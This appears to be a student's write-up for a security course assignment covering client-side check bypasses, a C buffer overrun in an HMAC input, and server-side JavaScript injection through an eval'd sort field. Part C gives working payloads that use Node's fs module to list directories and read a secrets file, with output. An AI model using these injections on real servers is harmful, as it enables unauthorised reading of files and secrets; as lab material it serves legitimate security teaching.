# Assignment 3 - More Web and IoT Insecurity
## Part A. Bypassing client-side checks
Using Google Chrome developer tools:

1) Add `tikinmusta` to the drop-down menu and then select it.

2) Remove the `EventHandler` that checks the username length condition. Now you should be able to submit new username that is over 21 characters long such as `testingover20characterslong`.


## Part B. Buffer overrun

```c
#define KEYLEN 20
#define MAXCMDLEN 18
#define MAXUSERLEN 10
#define CLIENTCMDTAG "ClientCmd"
#define MAXHMACINPUTLEN (sizeof(CLIENTCMDTAG) + 1 + MAXCMDLEN + 1 + MAXUSERLEN) /* =40 */
```

```c
char keyphrase[KEYLEN + 1] = {0};  // KEYLEN=20
char hmac_input[MAXHMACINPUTLEN + 1] = {0};  // MAXHMACINPUTLEN=40
```

```c
sprintf(hmac_input, "%s|%s|%s", CLIENTCMDTAG, user_rec, command_rec);
```
- `hmac_input` 41 bytes allocated
- `CLIENTCMDTAG` is 9 characters long
- `user_rec` is 6 characters long
- Two vertical bars `|` take 2 characters


## Part C. Server-side poisoning
```js
// ...
// Plants that will be returned to the client
var retPlants = [];
bookshelf.knex.raw(sql_query).then(function(plants){
    plants.forEach(function(p){
        retPlants.push({
            ’name’:p.name,
            ’color’:p.color,
            ’planttype’:p.planttype,
            ’potsize’:p.potsize
        });
    });
    // Field name from drop - down selection
    var field = req.body.sort_field;
    // Sort the plants
    retPlants.sort(function(a,b){
        var av,bv;
        with (a) { av = eval(field); };
        with (b) { bv = eval(field); };
        return av >= bv ;
    });
    // ...
});
```

Inject javascript into the `sort by` field by adding options using developer tools. [@server_side_js_injection]

1) List the contents of the current directory:

    ```js
    res.end(require('fs').readdirSync('.').toString())
    ```
    ```txt
    .gitignore,__init__.py,config,models,node_modules,package-lock.json,
    package.json,potplant.db,public,routes,secrets,server.js,utils,views
    ```

2) List the contents of the `secrets` directory:

    ```js
    res.end(require('fs').readdirSync('secrets').toString())
    ```
    ```txt
    secretmessage_3096.txt
    ```

3) View the actual content of the `secrets/secretmessage_3096.txt` file:

    ```js
    res.end(require('fs').readFileSync('secrets/secretmessage_3096.txt'))
    ```
    ```txt
    Instructions from boss: code ecc35a2dbf4a0e06 for agent 452056.
    ```

## References
